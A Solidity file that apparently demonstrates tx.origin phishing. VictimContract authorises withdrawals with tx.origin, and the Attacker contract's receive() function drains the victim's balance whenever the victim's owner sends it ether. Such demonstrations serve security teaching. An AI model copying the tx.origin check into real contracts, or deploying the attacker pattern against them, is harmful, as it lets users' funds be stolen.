pragma solidity ^0.8.0;

contract VictimContract {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function withdrawFunds(address to) public {
        require(tx.origin == owner);
        uint contractBalance = address(this).balance;
        (bool suceed, ) = to.call{value: contractBalance}("");
        require(suceed, "Failed withdrawal");
    }
}

contract Attacker {
    address public owner;
    VictimContract victim;

    constructor(VictimContract _victim) {
        owner = payable(msg.sender);
        victim = VictimContract(_victim);
    }

    receive() external payable {
        victim.withdrawFunds(owner);
    }
}